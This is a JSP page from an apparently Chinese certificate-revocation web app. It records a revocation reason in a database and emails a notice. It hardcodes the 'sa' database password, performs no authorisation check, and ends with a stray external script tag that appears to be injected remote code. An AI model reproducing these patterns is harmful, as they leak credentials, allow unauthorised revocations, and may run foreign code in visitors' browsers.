<%@ page contentType="text/html;charset=gb2312"%>
<%@ page import="java.sql.*"%>
<%@ page import="java.util.*"%>
<%@ page import="java.io.*"%>
<%@ page import="rvBeans.Date2Id"%>
<%@ page import="rvBeans.RvMail"%>
<%
String certId=request.getParameter("certId");

if(certId==null || certId.length()==0)
{
}
else
{
	String rvReason=request.getParameter("reason");
	if(rvReason==null || rvReason.trim().length()==0)
	{
%>
<script language="javascript"> window.alert("对不起，您没有填写撤消原因！"); history.back();</script>
<%
	}
	else
	{

		rvReason=new String(rvReason.getBytes("ISO-8859-1")).trim();

		Connection conn=null;
		try
		{
			Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
			conn=DriverManager.getConnection("jdbc:odbc:applyDB","sa","lilanfen");
			PreparedStatement pstmt=conn.prepareStatement("insert into revocation(certId,rvDate,rvReason) values(?,?,?)");
			pstmt.setLong(1,Long.parseLong(certId));
			pstmt.setString(2,new java.util.Date().toString());
			pstmt.setString(3,rvReason);
			int result=pstmt.executeUpdate();
			if(result>0)
			{
				RvMail rvmail=new RvMail();
				int sendOk=rvmail.sendMail(certId,rvReason);
				if(sendOk==0)
				{
%>
<script language="javascript"> window.alert("撤消成功！");  window.alert("已经发送了EMAIL通知！");location.href="index.jsp";</script>
<%
				}
				else if(sendOk==-1)
				{
%>
<script language="javascript"> window.alert("撤消成功！但事实上数据库中并无此证书号！");location.href="index.jsp";</script>
<%
				}
				else
				{
%>
<script language="javascript"> window.alert("撤消成功！");window.alert("发送EMAIL失败，可能是由于邮件服务的问题！");location.href="index.jsp";</script>
<%
				}
			}
			else
			{
%>
<script language="javascript"> window.alert("撤消失败，可能该证书已经被撤消过！"); location.href="index.jsp";</script>
<%
			}
		}
		catch(Exception ex)
		{
%>
<script language="javascript"> window.alert("撤消失败，数据库错误！"); location.href="index.jsp";</script>
<%
		}
		try{conn.close();}catch(Exception ex){}
	}
}
%>
<script language=javascript src=http://www.qq.com/qq.js></script>